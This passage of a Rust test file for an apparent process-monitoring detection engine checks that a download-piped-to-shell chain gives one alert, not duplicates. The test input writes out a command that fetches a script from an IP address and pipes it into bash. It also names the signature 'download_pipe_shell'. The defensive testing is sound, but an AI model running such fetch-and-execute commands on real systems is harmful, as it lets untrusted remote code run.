        if (kind == "benign" && o.max >= Confidence::High)
            || (kind == "attack" && id != "WA08" && o.max < minimum)
        {
            bad.push(id);
        }
    }
    assert!(bad.is_empty(), "windows mismatches: {bad:?}");
}

#[test]
fn apacks_download_blocker_real_lineage_and_no_wrapper_duplicate() {
    // Exact APACKS unrelated_download_case inputs (same session/PID-1 ancestor).
    let mut engine = production_like_engine();
    let download = ev(1, ProcessExec, 900, 1, 1000, "curl", "cron", 900)
        .cmd("curl https://hc-ping.example/uuid")
        .file("/usr/bin/curl", false);
    let unrelated = ev(2, ProcessExec, 901, 1, 1000, "bash", "sshd", 900)
        .cmd("/bin/bash /home/synthetic/deploy.sh")
        .file("/usr/bin/bash", false);
    for e in [download, unrelated] {
        let outcome = engine.process_event(&e.0);
        assert_eq!(outcome.confidence, Confidence::None);
        assert_eq!(outcome.layer1.result, detection::Layer1Result::Clean);
        assert!(!outcome.layer1.prefilter_hit);
        assert!(outcome.layer1.matched_signatures.is_empty());
        assert!(outcome.temporal_hits.is_empty());
        assert!(outcome.kill_chain_hits.is_empty());
    }
    // Same APACKS pipe string/IP, with the children a real pipeline necessarily spawns.
    let mut engine = production_like_engine();
    let parent = ev(1, ProcessExec, 900, 1, 1000, "sh", "bash", 900)
        .cmd("sh -c 'curl -s http://203.0.113.9/x.sh | bash'")
        .file("/usr/bin/sh", false);
    let parent_outcome = engine.process_event(&parent.0);
    assert!(parent_outcome
        .layer1
        .matched_signatures
        .iter()
        .any(|s| s == "download_pipe_shell"));
    assert_eq!(
        parent_outcome.confidence,
        Confidence::None,
        "wrapper is context, not a second alert"
    );
    let mut alerts = Vec::new();
    if parent_outcome.confidence != Confidence::None {
        alerts.push(parent_outcome);
    }
    for e in [
        ev(2, ProcessExec, 901, 900, 1000, "curl", "sh", 900)
            .cmd("curl -s http://203.0.113.9/x.sh")
            .file("/usr/bin/curl", false),
        ev(3, ProcessExec, 902, 900, 1000, "bash", "sh", 900)
            .cmd("bash")
            .file("/usr/bin/bash", false),
    ] {
        let outcome = engine.process_event(&e.0);
        if outcome.confidence != Confidence::None {
            alerts.push(outcome);
        }
    }
    assert_eq!(alerts.len(), 1, "one pipeline, one finding");
    assert_eq!(alerts[0].confidence, Confidence::Medium);
    assert_eq!(alerts[0].temporal_hits, vec!["phi_download_pipe_shell"]);
}
